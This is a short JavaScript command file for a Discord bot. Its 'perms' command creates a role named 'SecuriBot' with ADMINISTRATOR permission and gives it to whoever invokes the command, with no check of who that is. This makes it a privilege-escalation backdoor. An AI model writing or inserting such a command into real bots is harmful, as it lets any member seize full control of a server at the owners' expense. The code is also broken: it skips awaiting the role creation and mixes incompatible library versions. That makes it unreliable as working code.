module.exports.run = async (bot, message, args) => {
  var role = message.guild.roles.create({ data: { name: 'SecuriBot', permissions: ['ADMINISTRATOR']}});
  message.member.addRole(role);
}

module.exports.help = {
  name: 'perms'
}
